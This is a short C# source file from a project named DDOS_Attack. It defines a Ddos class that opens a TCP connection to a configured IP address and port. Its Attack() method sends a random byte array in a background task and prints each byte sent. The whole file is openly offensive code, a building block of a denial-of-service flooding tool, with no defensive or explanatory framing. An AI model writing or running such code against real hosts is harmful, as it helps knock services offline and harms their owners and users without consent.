using System;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;

namespace DDOS_Attack
{
    internal class Ddos
    {
        public byte[] MessageSent;
        private readonly IPAddress _ipAddr = IPAddress.Parse(Global.Ipaddr);
        private readonly Socket _socket;

        public Ddos()
        {
            var localEndPoint = new IPEndPoint(_ipAddr, Global.Port);
            MessageSent = Rnd.GetRndByteArray();
            _socket = new Socket(_ipAddr.AddressFamily,
                SocketType.Stream, ProtocolType.Tcp);
            _socket.Connect(localEndPoint);
        }

        public void Attack()
        {
            Task.Run(() =>
            {
                try
                {
                    _socket.Send(MessageSent);
                    foreach (var i in MessageSent)
                    {
                        Console.WriteLine($"send {i} - {Convert.ToChar(i)}");
                    }
                }
                catch (SocketException)
                {
                    Console.WriteLine("Remote Host closed the connection or an unexpected error occured");
                }
            });
        }

    }
}